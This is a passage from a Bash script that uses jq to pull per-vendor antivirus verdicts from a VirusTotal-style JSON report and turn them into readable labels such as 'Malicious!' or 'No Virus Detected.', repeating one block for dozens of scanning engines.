    CMC_Result=$(jq '.[] | .attributes.last_analysis_results."CMC".result' FILERESULTS.json | xargs)
    if [[ ${CMC_Result} == *"null"* ]];then
    CMC_Result="Null"
    elif [[ -z ${CMC_Result} ]];then
    CMC_Result="ERROR!"
    fi



    COMODO_Category=$(jq '.[] | .attributes.last_analysis_results."Comodo".category' FILERESULTS.json | xargs) 
    if [[ ${COMODO_Category} == *"undetected"* ]];then
    COMODO_Category="No Virus Detected."
    elif [[ ${COMODO_Category} == *"null"* ]];then
    COMODO_Category="Null"
    elif [[ ${COMODO_Category} == *"type-unsupported"* ]];then
    COMODO_Category="Unsupported"
    elif [[ ${COMODO_Category} == *"malicious"* ]];then
    COMODO_Category="Malicious!"
    elif [[ ${COMODO_Category} == *"failure"* ]];then
    COMODO_Category="ERROR!"
    elif [[ -z ${COMODO_Category} ]];then
    COMODO_Category="ERROR!"
    fi

    COMODO_Result=$(jq '.[] | .attributes.last_analysis_results."Comodo".result' FILERESULTS.json | xargs)
    if [[ ${COMODO_Result} == *"null"* ]];then
    COMODO_Result="Null"
    elif [[ -z ${COMODO_Result} ]];then
    COMODO_Result="ERROR!"
    fi



    CYBEREASON_Category=$(jq '.[] | .attributes.last_analysis_results."Cybereason".category' FILERESULTS.json | xargs) 
    if [[ ${CYBEREASON_Category} == *"undetected"* ]];then
    CYBEREASON_Category="No Virus Detected."
    elif [[ ${CYBEREASON_Category} == *"null"* ]];then
    CYBEREASON_Category="Null"
    elif [[ ${CYBEREASON_Category} == *"type-unsupported"* ]];then
    CYBEREASON_Category="Unsupported"
    elif [[ ${CYBEREASON_Category} == *"malicious"* ]];then
    CYBEREASON_Category="Malicious!"
    elif [[ ${CYBEREASON_Category} == *"failure"* ]];then
    CYBEREASON_Category="ERROR!"
    elif [[ -z ${CYBEREASON_Category} ]];then
    CYBEREASON_Category="ERROR!"
    fi

    CYBEREASON_Result=$(jq '.[] | .attributes.last_analysis_results."Cybereason".result' FILERESULTS.json | xargs)
    if [[ ${CYBEREASON_Result} == *"null"* ]];then
    CYBEREASON_Result="Null"
    elif [[ -z ${CYBEREASON_Result} ]];then
    CYBEREASON_Result="ERROR!"
    fi



    CYNET_Category=$(jq '.[] | .attributes.last_analysis_results."Cynet".category' FILERESULTS.json | xargs) 
    if [[ ${CYNET_Category} == *"undetected"* ]];then
    CYNET_Category="No Virus Detected."
    elif [[ ${CYNET_Category} == *"null"* ]];then
    CYNET_Category="Null"
    elif [[ ${CYNET_Category} == *"type-unsupported"* ]];then
    CYNET_Category="Unsupported"
    elif [[ ${CYNET_Category} == *"malicious"* ]];then
    CYNET_Category="Malicious!"
    elif [[ ${CYNET_Category} == *"failure"* ]];then
    CYNET_Category="ERROR!"
    elif [[ -z ${CYNET_Category} ]];then
    CYNET_Category="ERROR!"
    fi

    CYNET_Result=$(jq '.[] | .attributes.last_analysis_results."Cynet".result' FILERESULTS.json | xargs)
    if [[ ${CYNET_Result} == *"null"* ]];then
    CYNET_Result="Null"
    elif [[ -z ${CYNET_Result} ]];then
    CYNET_Result="ERROR!"
    fi



    CYREN_Category=$(jq '.[] | .attributes.last_analysis_results."Cyren".category' FILERESULTS.json | xargs) 
    if [[ ${CYREN_Category} == *"undetected"* ]];then
    CYREN_Category="No Virus Detected."
    elif [[ ${CYREN_Category} == *"null"* ]];then
    CYREN_Category="Null"
    elif [[ ${CYREN_Category} == *"type-unsupported"* ]];then
    CYREN_Category="Unsupported"
    elif [[ ${CYREN_Category} == *"malicious"* ]];then
    CYREN_Category="Malicious!"
    elif [[ ${CYREN_Category} == *"failure"* ]];then
    CYREN_Category="ERROR!"
    elif [[ -z ${CYREN_Category} ]];then
    CYREN_Category="ERROR!"
    fi

    CYREN_Result=$(jq '.[] | .attributes.last_analysis_results."Cyren".result' FILERESULTS.json | xargs)
    if [[ ${CYREN_Result} == *"null"* ]];then
    CYREN_Result="Null"
    elif [[ -z ${CYREN_Result} ]];then
    CYREN_Result="ERROR!"
    fi



    CYLANCE_Category=$(jq '.[] | .attributes.last_analysis_results."Cylance".category' FILERESULTS.json | xargs) 
    if [[ ${CYLANCE_Category} == *"undetected"* ]];then
    CYLANCE_Category="No Virus Detected."
    elif [[ ${CYLANCE_Category} == *"null"* ]];then
    CYLANCE_Category="Null"
    elif [[ ${CYLANCE_Category} == *"type-unsupported"* ]];then
    CYLANCE_Category="Unsupported"
    elif [[ ${CYLANCE_Category} == *"malicious"* ]];then
    CYLANCE_Category="Malicious!"
    elif [[ ${CYLANCE_Category} == *"failure"* ]];then
    CYLANCE_Category="ERROR!"
    elif [[ -z ${CYLANCE_Category} ]];then
    CYLANCE_Category="ERROR!"
    fi

    CYLANCE_Result=$(jq '.[] | .attributes.last_analysis_results."Cylance".result' FILERESULTS.json | xargs)
    if [[ ${CYLANCE_Result} == *"null"* ]];then
    CYLANCE_Result="Null"
    elif [[ -z ${CYLANCE_Result} ]];then
    CYLANCE_Result="ERROR!"
    fi



    DRWEB_Category=$(jq '.[] | .attributes.last_analysis_results."DrWeb".category' FILERESULTS.json | xargs) 
    if [[ ${DRWEB_Category} == *"undetected"* ]];then
    DRWEB_Category="No Virus Detected."
    elif [[ ${DRWEB_Category} == *"null"* ]];then
    DRWEB_Category="Null"
    elif [[ ${DRWEB_Category} == *"type-unsupported"* ]];then
    DRWEB_Category="Unsupported"
    elif [[ ${DRWEB_Category} == *"malicious"* ]];then
    DRWEB_Category="Malicious!"
    elif [[ ${DRWEB_Category} == *"failure"* ]];then
    DRWEB_Category="ERROR!"
    elif [[ -z ${DRWEB_Category} ]];then
    DRWEB_Category="ERROR!"
    fi

    DRWEB_Result=$(jq '.[] | .attributes.last_analysis_results."DrWeb".result' FILERESULTS.json | xargs)
    if [[ ${DRWEB_Result} == *"null"* ]];then
    DRWEB_Result="Null"
    elif [[ -z ${DRWEB_Result} ]];then
    DRWEB_Result="ERROR!"
    fi



    EMSISOFT_Category=$(jq '.[] | .attributes.last_analysis_results."Emsisoft".category' FILERESULTS.json | xargs) 
    if [[ ${EMSISOFT_Category} == *"undetected"* ]];then
    EMSISOFT_Category="No Virus Detected."
    elif [[ ${EMSISOFT_Category} == *"null"* ]];then
    EMSISOFT_Category="Null"
    elif [[ ${EMSISOFT_Category} == *"type-unsupported"* ]];then
    EMSISOFT_Category="Unsupported"
    elif [[ ${EMSISOFT_Category} == *"malicious"* ]];then
    EMSISOFT_Category="Malicious!"
    elif [[ ${EMSISOFT_Category} == *"failure"* ]];then
    EMSISOFT_Category="ERROR!"
    elif [[ -z ${EMSISOFT_Category} ]];then
    EMSISOFT_Category="ERROR!"
    fi

    EMSISOFT_Result=$(jq '.[] | .attributes.last_analysis_results."Emsisoft".result' FILERESULTS.json | xargs)
    if [[ ${EMSISOFT_Result} == *"null"* ]];then
    EMSISOFT_Result="Null"
    elif [[ -z ${EMSISOFT_Result} ]];then
    EMSISOFT_Result="ERROR!"
    fi



    ELASTIC_Category=$(jq '.[] | .attributes.last_analysis_results."Elastic".category' FILERESULTS.json | xargs) 
    if [[ ${ELASTIC_Category} == *"undetected"* ]];then
    ELASTIC_Category="No Virus Detected."
    elif [[ ${ELASTIC_Category} == *"null"* ]];then
    ELASTIC_Category="Null"
    elif [[ ${ELASTIC_Category} == *"type-unsupported"* ]];then
    ELASTIC_Category="Unsupported"
    elif [[ ${ELASTIC_Category} == *"malicious"* ]];then
    ELASTIC_Category="Malicious!"
    elif [[ ${ELASTIC_Category} == *"failure"* ]];then
    ELASTIC_Category="ERROR!"
    elif [[ -z ${ELASTIC_Category} ]];then
    ELASTIC_Category="ERROR!"
    fi

    ELASTIC_Result=$(jq '.[] | .attributes.last_analysis_results."Elastic".result' FILERESULTS.json | xargs)
    if [[ ${ELASTIC_Result} == *"null"* ]];then
    ELASTIC_Result="Null"
    elif [[ -z ${ELASTIC_Result} ]];then
    ELASTIC_Result="ERROR!"
    fi



    MWSCAN_Category=$(jq '.[] | .attributes.last_analysis_results."MicroWorld-eScan".category' FILERESULTS.json | xargs) 
    if [[ ${MWSCAN_Category} == *"undetected"* ]];then
    MWSCAN_Category="No Virus Detected."
    elif [[ ${MWSCAN_Category} == *"null"* ]];then
    MWSCAN_Category="Null"
    elif [[ ${MWSCAN_Category} == *"type-unsupported"* ]];then
    MWSCAN_Category="Unsupported"
    elif [[ ${MWSCAN_Category} == *"malicious"* ]];then
    MWSCAN_Category="Malicious!"
    elif [[ ${MWSCAN_Category} == *"failure"* ]];then
    MWSCAN_Category="ERROR!"
    elif [[ -z ${MWSCAN_Category} ]];then
    MWSCAN_Category="ERROR!"
    fi

    MWSCAN_Result=$(jq '.[] | .attributes.last_analysis_results."MicroWorld-eScan".result' FILERESULTS.json | xargs)
    if [[ ${MWSCAN_Result} == *"null"* ]];then
    MWSCAN_Result="Null"
    elif [[ -z ${MWSCAN_Result} ]];then
    MWSCAN_Result="ERROR!"
    fi



    ESETNOD32_Category=$(jq '.[] | .attributes.last_analysis_results."ESET-NOD32".category' FILERESULTS.json | xargs) 
    if [[ ${ESETNOD32_Category} == *"undetected"* ]];then
    ESETNOD32_Category="No Virus Detected."
    elif [[ ${ESETNOD32_Category} == *"null"* ]];then
    ESETNOD32_Category="Null"
    elif [[ ${ESETNOD32_Category} == *"type-unsupported"* ]];then
    ESETNOD32_Category="Unsupported"
    elif [[ ${ESETNOD32_Category} == *"malicious"* ]];then
    ESETNOD32_Category="Malicious!"
    elif [[ ${ESETNOD32_Category} == *"failure"* ]];then
    ESETNOD32_Category="ERROR!"
    elif [[ -z ${ESETNOD32_Category} ]];then
    ESETNOD32_Category="ERROR!"
    fi

    ESETNOD32_Result=$(jq '.[] | .attributes.last_analysis_results."ESET-NOD32".result' FILERESULTS.json | xargs)
    if [[ ${ESETNOD32_Result} == *"null"* ]];then
    ESETNOD32_Result="Null"
    elif [[ -z ${ESETNOD32_Result} ]];then
    ESETNOD32_Result="ERROR!"
    fi



    FSECURE_Category=$(jq '.[] | .attributes.last_analysis_results."F-Secure".category' FILERESULTS.json | xargs) 
    if [[ ${FSECURE_Category} == *"undetected"* ]];then
    FSECURE_Category="No Virus Detected."
    elif [[ ${FSECURE_Category} == *"null"* ]];then
    FSECURE_Category="Null"
    elif [[ ${FSECURE_Category} == *"type-unsupported"* ]];then
    FSECURE_Category="Unsupported"
    elif [[ ${FSECURE_Category} == *"malicious"* ]];then
    FSECURE_Category="Malicious!"
    elif [[ ${FSECURE_Category} == *"failure"* ]];then
    FSECURE_Category="ERROR!"
    elif [[ -z ${FSECURE_Category} ]];then
    FSECURE_Category="ERROR!"
    fi

    FSECURE_Result=$(jq '.[] | .attributes.last_analysis_results."F-Secure".result' FILERESULTS.json | xargs)
    if [[ ${FSECURE_Result} == *"null"* ]];then
    FSECURE_Result="Null"
    elif [[ -z ${FSECURE_Result} ]];then
    FSECURE_Result="ERROR!"
    fi



    FORTINET_Category=$(jq '.[] | .attributes.last_analysis_results."Fortinet".category' FILERESULTS.json | xargs) 
    if [[ ${FORTINET_Category} == *"undetected"* ]];then
    FORTINET_Category="No Virus Detected."
    elif [[ ${FORTINET_Category} == *"null"* ]];then
    FORTINET_Category="Null"
    elif [[ ${FORTINET_Category} == *"type-unsupported"* ]];then
    FORTINET_Category="Unsupported"
    elif [[ ${FORTINET_Category} == *"malicious"* ]];then
    FORTINET_Category="Malicious!"
    elif [[ ${FORTINET_Category} == *"failure"* ]];then
    FORTINET_Category="ERROR!"
    elif [[ -z ${FORTINET_Category} ]];then
    FORTINET_Category="ERROR!"
    fi

    FORTINET_Result=$(jq '.[] | .attributes.last_analysis_results."Fortinet".result' FILERESULTS.json | xargs)
    if [[ ${FORTINET_Result} == *"null"* ]];then
    FORTINET_Result="Null"
    elif [[ -z ${FORTINET_Result} ]];then
    FORTINET_Result="ERROR!"
    fi



    GDATA_Category=$(jq '.[] | .attributes.last_analysis_results."GData".category' FILERESULTS.json | xargs) 
    if [[ ${GDATA_Category} == *"undetected"* ]];then
    GDATA_Category="No Virus Detected."
    elif [[ ${GDATA_Category} == *"null"* ]];then
    GDATA_Category="Null"
    elif [[ ${GDATA_Category} == *"type-unsupported"* ]];then
    GDATA_Category="Unsupported"
    elif [[ ${GDATA_Category} == *"malicious"* ]];then
    GDATA_Category="Malicious!"
    elif [[ ${GDATA_Category} == *"failure"* ]];then
    GDATA_Category="ERROR!"
    elif [[ -z ${GDATA_Category} ]];then
    GDATA_Category="ERROR!"
    fi

    GDATA_Result=$(jq '.[] | .attributes.last_analysis_results."GData".result' FILERESULTS.json | xargs)
    if [[ ${GDATA_Result} == *"null"* ]];then
    GDATA_Result="Null"
    elif [[ -z ${GDATA_Result} ]];then
    GDATA_Result="ERROR!"
    fi



    GRIDINSOFT_Category=$(jq '.[] | .attributes.last_analysis_results."Gridinsoft".category' FILERESULTS.json | xargs) 
    if [[ ${GRIDINSOFT_Category} == *"undetected"* ]];then
    GRIDINSOFT_Category="No Virus Detected."
    elif [[ ${GRIDINSOFT_Category} == *"null"* ]];then
    GRIDINSOFT_Category="Null"
    elif [[ ${GRIDINSOFT_Category} == *"type-unsupported"* ]];then
    GRIDINSOFT_Category="Unsupported"
    elif [[ ${GRIDINSOFT_Category} == *"malicious"* ]];then
    GRIDINSOFT_Category="Malicious!"
    elif [[ ${GRIDINSOFT_Category} == *"failure"* ]];then
    GRIDINSOFT_Category="ERROR!"
    elif [[ -z ${GRIDINSOFT_Category} ]];then
    GRIDINSOFT_Category="ERROR!"
    fi

    GRIDINSOFT_Result=$(jq '.[] | .attributes.last_analysis_results."Gridinsoft".result' FILERESULTS.json | xargs)
    if [[ ${GRIDINSOFT_Result} == *"null"* ]];then
    GRIDINSOFT_Result="Null"
    elif [[ -z ${GRIDINSOFT_Result} ]];then
    GRIDINSOFT_Result="ERROR!"
    fi



    IKARUS_Category=$(jq '.[] | .attributes.last_analysis_results."Ikarus".category' FILERESULTS.json | xargs) 
    if [[ ${IKARUS_Category} == *"undetected"* ]];then
    IKARUS_Category="No Virus Detected."
    elif [[ ${IKARUS_Category} == *"null"* ]];then
    IKARUS_Category="Null"
    elif [[ ${IKARUS_Category} == *"type-unsupported"* ]];then
    IKARUS_Category="Unsupported"
    elif [[ ${IKARUS_Category} == *"malicious"* ]];then
    IKARUS_Category="Malicious!"
    elif [[ ${IKARUS_Category} == *"failure"* ]];then
    IKARUS_Category="ERROR!"
    elif [[ -z ${IKARUS_Category} ]];then
    IKARUS_Category="ERROR!"
    fi

    IKARUS_Result=$(jq '.[] | .attributes.last_analysis_results."Ikarus".result' FILERESULTS.json | xargs)
    if [[ ${IKARUS_Result} == *"null"* ]];then
    IKARUS_Result="Null"
    elif [[ -z ${IKARUS_Result} ]];then
    IKARUS_Result="ERROR!"
    fi



    JIANGMIN_Category=$(jq '.[] | .attributes.last_analysis_results."Jiangmin".category' FILERESULTS.json | xargs) 
    if [[ ${JIANGMIN_Category} == *"undetected"* ]];then
    JIANGMIN_Category="No Virus Detected."
    elif [[ ${JIANGMIN_Category} == *"null"* ]];then
    JIANGMIN_Category="Null"
    elif [[ ${JIANGMIN_Category} == *"type-unsupported"* ]];then
    JIANGMIN_Category="Unsupported"
    elif [[ ${JIANGMIN_Category} == *"malicious"* ]];then
    JIANGMIN_Category="Malicious!"
    elif [[ ${JIANGMIN_Category} == *"failure"* ]];then
    JIANGMIN_Category="ERROR!"
    elif [[ -z ${JIANGMIN_Category} ]];then
    JIANGMIN_Category="ERROR!"
    fi

    JIANGMIN_Result=$(jq '.[] | .attributes.last_analysis_results."Jiangmin".result' FILERESULTS.json | xargs)
    if [[ ${JIANGMIN_Result} == *"null"* ]];then
    JIANGMIN_Result="Null"
    elif [[ -z ${JIANGMIN_Result} ]];then
    JIANGMIN_Result="ERROR!"
    fi



    K7AV_Category=$(jq '.[] | .attributes.last_analysis_results."K7AntiVirus".category' FILERESULTS.json | xargs) 
    if [[ ${K7AV_Category} == *"undetected"* ]];then
    K7AV_Category="No Virus Detected."
    elif [[ ${K7AV_Category} == *"null"* ]];then
    K7AV_Category="Null"
    elif [[ ${K7AV_Category} == *"type-unsupported"* ]];then
    K7AV_Category="Unsupported"
    elif [[ ${K7AV_Category} == *"malicious"* ]];then
    K7AV_Category="Malicious!"
    elif [[ ${K7AV_Category} == *"failure"* ]];then
    K7AV_Category="ERROR!"
    elif [[ -z ${K7AV_Category} ]];then
    K7AV_Category="ERROR!"
    fi

    K7AV_Result=$(jq '.[] | .attributes.last_analysis_results."K7AntiVirus".result' FILERESULTS.json | xargs)
    if [[ ${K7AV_Result} == *"null"* ]];then
    K7AV_Result="Null"
    elif [[ -z ${K7AV_Result} ]];then
    K7AV_Result="ERROR!"
    fi



    K7GW_Category=$(jq '.[] | .attributes.last_analysis_results."K7GW".category' FILERESULTS.json | xargs) 
    if [[ ${K7GW_Category} == *"undetected"* ]];then
    K7GW_Category="No Virus Detected."
    elif [[ ${K7GW_Category} == *"null"* ]];then
    K7GW_Category="Null"
    elif [[ ${K7GW_Category} == *"type-unsupported"* ]];then
    K7GW_Category="Unsupported"
    elif [[ ${K7GW_Category} == *"malicious"* ]];then
    K7GW_Category="Malicious!"
    elif [[ ${K7GW_Category} == *"failure"* ]];then
    K7GW_Category="ERROR!"
    elif [[ -z ${K7GW_Category} ]];then
    K7GW_Category="ERROR!"
    fi

    K7GW_Result=$(jq '.[] | .attributes.last_analysis_results."K7GW".result' FILERESULTS.json | xargs)
    if [[ ${K7GW_Result} == *"null"* ]];then
    K7GW_Result="Null"
    elif [[ -z ${K7GW_Result} ]];then
    K7GW_Result="ERROR!"
    fi



    KASPERSKY_Category=$(jq '.[] | .attributes.last_analysis_results."Kaspersky".category' FILERESULTS.json | xargs) 
    if [[ ${KASPERSKY_Category} == *"undetected"* ]];then
    KASPERSKY_Category="No Virus Detected."
    elif [[ ${KASPERSKY_Category} == *"null"* ]];then
    KASPERSKY_Category="Null"
    elif [[ ${KASPERSKY_Category} == *"type-unsupported"* ]];then
    KASPERSKY_Category="Unsupported"
    elif [[ ${KASPERSKY_Category} == *"malicious"* ]];then
    KASPERSKY_Category="Malicious!"
    elif [[ ${KASPERSKY_Category} == *"failure"* ]];then
    KASPERSKY_Category="ERROR!"
    elif [[ -z ${KASPERSKY_Category} ]];then
    KASPERSKY_Category="ERROR!"
    fi

    KASPERSKY_Result=$(jq '.[] | .attributes.last_analysis_results."Kaspersky".result' FILERESULTS.json | xargs)
    if [[ ${KASPERSKY_Result} == *"null"* ]];then
    KASPERSKY_Result="Null"
    elif [[ -z ${KASPERSKY_Result} ]];then
    KASPERSKY_Result="ERROR!"
    fi



    KINGSOFT_Category=$(jq '.[] | .attributes.last_analysis_results."Kingsoft".category' FILERESULTS.json | xargs) 
    if [[ ${KINGSOFT_Category} == *"undetected"* ]];then
    KINGSOFT_Category="No Virus Detected."
    elif [[ ${KINGSOFT_Category} == *"null"* ]];then
    KINGSOFT_Category="Null"
    elif [[ ${KINGSOFT_Category} == *"type-unsupported"* ]];then
    KINGSOFT_Category="Unsupported"
    elif [[ ${KINGSOFT_Category} == *"malicious"* ]];then
    KINGSOFT_Category="Malicious!"
    elif [[ ${KINGSOFT_Category} == *"failure"* ]];then
    KINGSOFT_Category="ERROR!"
    elif [[ -z ${KINGSOFT_Category} ]];then
    KINGSOFT_Category="ERROR!"
    fi

    KINGSOFT_Result=$(jq '.[] | .attributes.last_analysis_results."Kingsoft".result' FILERESULTS.json | xargs)
    if [[ ${KINGSOFT_Result} == *"null"* ]];then
    KINGSOFT_Result="Null"
    elif [[ -z ${KINGSOFT_Result} ]];then
    KINGSOFT_Result="ERROR!"
    fi



    LIONIC_Category=$(jq '.[] | .attributes.last_analysis_results."Lionic".category' FILERESULTS.json | xargs) 
    if [[ ${LIONIC_Category} == *"undetected"* ]];then
    LIONIC_Category="No Virus Detected."
    elif [[ ${LIONIC_Category} == *"null"* ]];then
    LIONIC_Category="Null"
    elif [[ ${LIONIC_Category} == *"type-unsupported"* ]];then
    LIONIC_Category="Unsupported"
    elif [[ ${LIONIC_Category} == *"malicious"* ]];then
    LIONIC_Category="Malicious!"
    elif [[ ${LIONIC_Category} == *"failure"* ]];then
    LIONIC_Category="ERROR!"
    elif [[ -z ${LIONIC_Category} ]];then
    LIONIC_Category="ERROR!"
    fi

    LIONIC_Result=$(jq '.[] | .attributes.last_analysis_results."Lionic".result' FILERESULTS.json | xargs)
    if [[ ${LIONIC_Result} == *"null"* ]];then
    LIONIC_Result="Null"
    elif [[ -z ${LIONIC_Result} ]];then
    LIONIC_Result="ERROR!"
    fi



    MALWAREBYTES_Category=$(jq '.[] | .attributes.last_analysis_results."Malwarebytes".category' FILERESULTS.json | xargs) 
    if [[ ${MALWAREBYTES_Category} == *"undetected"* ]];then
    MALWAREBYTES_Category="No Virus Detected."
    elif [[ ${MALWAREBYTES_Category} == *"null"* ]];then
    MALWAREBYTES_Category="Null"
    elif [[ ${MALWAREBYTES_Category} == *"type-unsupported"* ]];then
    MALWAREBYTES_Category="Unsupported"
    elif [[ ${MALWAREBYTES_Category} == *"malicious"* ]];then
    MALWAREBYTES_Category="Malicious!"
    elif [[ ${MALWAREBYTES_Category} == *"failure"* ]];then
    MALWAREBYTES_Category="ERROR!"
    elif [[ -z ${MALWAREBYTES_Category} ]];then
    MALWAREBYTES_Category="ERROR!"
    fi

    MALWAREBYTES_Result=$(jq '.[] | .attributes.last_analysis_results."Malwarebytes".result' FILERESULTS.json | xargs)
    if [[ ${MALWAREBYTES_Result} == *"null"* ]];then
    MALWAREBYTES_Result="Null"
    elif [[ -z ${MALWAREBYTES_Result} ]];then
    MALWAREBYTES_Result="ERROR!"
    fi



    MAX_Category=$(jq '.[] | .attributes.last_analysis_results."MAX".category' FILERESULTS.json | xargs) 
    if [[ ${MAX_Category} == *"undetected"* ]];then
    MAX_Category="No Virus Detected."
    elif [[ ${MAX_Category} == *"null"* ]];then
    MAX_Category="Null"
    elif [[ ${MAX_Category} == *"type-unsupported"* ]];then
    MAX_Category="Unsupported"
    elif [[ ${MAX_Category} == *"malicious"* ]];then
    MAX_Category="Malicious!"
    elif [[ ${MAX_Category} == *"failure"* ]];then
    MAX_Category="ERROR!"
    elif [[ -z ${MAX_Category} ]];then
    MAX_Category="ERROR!"
    fi

    MAX_Result=$(jq '.[] | .attributes.last_analysis_results."MAX".result' FILERESULTS.json | xargs)
    if [[ ${MAX_Result} == *"null"* ]];then
    MAX_Result="Null"
    elif [[ -z ${MAX_Result} ]];then
    MAX_Result="ERROR!"
    fi



    MAXSEC_Category=$(jq '.[] | .attributes.last_analysis_results."MaxSecure".category' FILERESULTS.json | xargs) 
    if [[ ${MAXSEC_Category} == *"undetected"* ]];then
    MAXSEC_Category="No Virus Detected."
    elif [[ ${MAXSEC_Category} == *"null"* ]];then
    MAXSEC_Category="Null"
    elif [[ ${MAXSEC_Category} == *"type-unsupported"* ]];then
    MAXSEC_Category="Unsupported"
    elif [[ ${MAXSEC_Category} == *"malicious"* ]];then
    MAXSEC_Category="Malicious!"
    elif [[ ${MAXSEC_Category} == *"failure"* ]];then
    MAXSEC_Category="ERROR!"
    elif [[ -z ${MAXSEC_Category} ]];then
    MAXSEC_Category="ERROR!"
    fi

    MAXSEC_Result=$(jq '.[] | .attributes.last_analysis_results."MaxSecure".result' FILERESULTS.json | xargs)
    if [[ ${MAXSEC_Result} == *"null"* ]];then
    MAXSEC_Result="Null"
    elif [[ -z ${MAXSEC_Result} ]];then
    MAXSEC_Result="ERROR!"
    fi



    MCAFEE_Category=$(jq '.[] | .attributes.last_analysis_results."McAfee".category' FILERESULTS.json | xargs) 
    if [[ ${MCAFEE_Category} == *"undetected"* ]];then
    MCAFEE_Category="No Virus Detected."
    elif [[ ${MCAFEE_Category} == *"null"* ]];then
    MCAFEE_Category="Null"
    elif [[ ${MCAFEE_Category} == *"type-unsupported"* ]];then
    MCAFEE_Category="Unsupported"
    elif [[ ${MCAFEE_Category} == *"malicious"* ]];then
    MCAFEE_Category="Malicious!"
    elif [[ ${MCAFEE_Category} == *"failure"* ]];then
    MCAFEE_Category="ERROR!"
    elif [[ -z ${MCAFEE_Category} ]];then
    MCAFEE_Category="ERROR!"
    fi

    MCAFEE_Result=$(jq '.[] | .attributes.last_analysis_results."McAfee".result' FILERESULTS.json | xargs)
    if [[ ${MCAFEE_Result} == *"null"* ]];then
    MCAFEE_Result="Null"
    elif [[ -z ${MCAFEE_Result} ]];then
    MCAFEE_Result="ERROR!"
    fi



    MCAFEEGW_Category=$(jq '.[] | .attributes.last_analysis_results." McAfee-GW-Edition".category' FILERESULTS.json | xargs) 
    if [[ ${MCAFEEGW_Category} == *"undetected"* ]];then
    MCAFEEGW_Category="No Virus Detected."
    elif [[ ${MCAFEEGW_Category} == *"null"* ]];then
    MCAFEEGW_Category="Null"
    elif [[ ${MCAFEEGW_Category} == *"type-unsupported"* ]];then
    MCAFEEGW_Category="Unsupported"
    elif [[ ${MCAFEEGW_Category} == *"malicious"* ]];then
    MCAFEEGW_Category="Malicious!"
    elif [[ ${MCAFEEGW_Category} == *"failure"* ]];then
    MCAFEEGW_Category="ERROR!"
    elif [[ -z ${MCAFEEGW_Category} ]];then
    MCAFEEGW_Category="ERROR!"
    fi

    MCAFEEGW_Result=$(jq '.[] | .attributes.last_analysis_results." McAfee-GW-Edition".result' FILERESULTS.json | xargs)
    if [[ ${MCAFEEGW_Result} == *"null"* ]];then
    MCAFEEGW_Result="Null"
    elif [[ -z ${MCAFEEGW_Result} ]];then
    MCAFEEGW_Result="ERROR!"
    fi



    MICROSOFT_Category=$(jq '.[] | .attributes.last_analysis_results."Microsoft".category' FILERESULTS.json | xargs) 
    if [[ ${MICROSOFT_Category} == *"undetected"* ]];then
    MICROSOFT_Category="No Virus Detected."
    elif [[ ${MICROSOFT_Category} == *"null"* ]];then
    MICROSOFT_Category="Null"
    elif [[ ${MICROSOFT_Category} == *"type-unsupported"* ]];then
    MICROSOFT_Category="Unsupported"
    elif [[ ${MICROSOFT_Category} == *"malicious"* ]];then
    MICROSOFT_Category="Malicious!"
    elif [[ ${MICROSOFT_Category} == *"failure"* ]];then
    MICROSOFT_Category="ERROR!"
    elif [[ -z ${MICROSOFT_Category} ]];then
    MICROSOFT_Category="ERROR!"
    fi

    MICROSOFT_Result=$(jq '.[] | .attributes.last_analysis_results."Microsoft".result' FILERESULTS.json | xargs)
    if [[ ${MICROSOFT_Result} == *"null"* ]];then
    MICROSOFT_Result="Null"
    elif [[ -z ${MICROSOFT_Result} ]];then
    MICROSOFT_Result="ERROR!"
    fi



    NANOAV_Category=$(jq '.[] | .attributes.last_analysis_results."NANO-Antivirus".category' FILERESULTS.json | xargs) 
    if [[ ${NANOAV_Category} == *"undetected"* ]];then
    NANOAV_Category="No Virus Detected."
    elif [[ ${NANOAV_Category} == *"null"* ]];then
    NANOAV_Category="Null"
    elif [[ ${NANOAV_Category} == *"type-unsupported"* ]];then
    NANOAV_Category="Unsupported"
    elif [[ ${NANOAV_Category} == *"malicious"* ]];then
    NANOAV_Category="Malicious!"
    elif [[ ${NANOAV_Category} == *"failure"* ]];then
    NANOAV_Category="ERROR!"
    elif [[ -z ${NANOAV_Category} ]];then
    NANOAV_Category="ERROR!"
    fi

    NANOAV_Result=$(jq '.[] | .attributes.last_analysis_results."NANO-Antivirus".result' FILERESULTS.json | xargs)
    if [[ ${NANOAV_Result} == *"null"* ]];then
    NANOAV_Result="Null"
    elif [[ -z ${NANOAV_Result} ]];then
    NANOAV_Result="ERROR!"
    fi



    PANDA_Category=$(jq '.[] | .attributes.last_analysis_results."Panda".category' FILERESULTS.json | xargs) 
    if [[ ${PANDA_Category} == *"undetected"* ]];then
    PANDA_Category="No Virus Detected."
    elif [[ ${PANDA_Category} == *"null"* ]];then
    PANDA_Category="Null"
    elif [[ ${PANDA_Category} == *"type-unsupported"* ]];then
    PANDA_Category="Unsupported"
    elif [[ ${PANDA_Category} == *"malicious"* ]];then
    PANDA_Category="Malicious!"
    elif [[ ${PANDA_Category} == *"failure"* ]];then
    PANDA_Category="ERROR!"
    elif [[ -z ${PANDA_Category} ]];then
    PANDA_Category="ERROR!"
    fi

    PANDA_Result=$(jq '.[] | .attributes.last_analysis_results."Panda".result' FILERESULTS.json | xargs)
    if [[ ${PANDA_Result} == *"null"* ]];then
    PANDA_Result="Null"
    elif [[ -z ${PANDA_Result} ]];then
    PANDA_Result="ERROR!"
    fi



    PALOALTO_Category=$(jq '.[] | .attributes.last_analysis_results."Paloalto".category' FILERESULTS.json | xargs) 
    if [[ ${PALOALTO_Category} == *"undetected"* ]];then
    PALOALTO_Category="No Virus Detected."
    elif [[ ${PALOALTO_Category} == *"null"* ]];then
    PALOALTO_Category="Null"
    elif [[ ${PALOALTO_Category} == *"type-unsupported"* ]];then
    PALOALTO_Category="Unsupported"
    elif [[ ${PALOALTO_Category} == *"malicious"* ]];then
    PALOALTO_Category="Malicious!"
    elif [[ ${PALOALTO_Category} == *"failure"* ]];then
    PALOALTO_Category="ERROR!"
    elif [[ -z ${PALOALTO_Category} ]];then
    PALOALTO_Category="ERROR!"
    fi

    PALOALTO_Result=$(jq '.[] | .attributes.last_analysis_results."Paloalto".result' FILERESULTS.json | xargs)
    if [[ ${PALOALTO_Result} == *"null"* ]];then
    PALOALTO_Result="Null"
    elif [[ -z ${PALOALTO_Result} ]];then
    PALOALTO_Result="ERROR!"
    fi



    RISING_Category=$(jq '.[] | .attributes.last_analysis_results."Rising".category' FILERESULTS.json | xargs) 
    if [[ ${RISING_Category} == *"undetected"* ]];then
    RISING_Category="No Virus Detected."
    elif [[ ${RISING_Category} == *"null"* ]];then
    RISING_Category="Null"
    elif [[ ${RISING_Category} == *"type-unsupported"* ]];then
    RISING_Category="Unsupported"
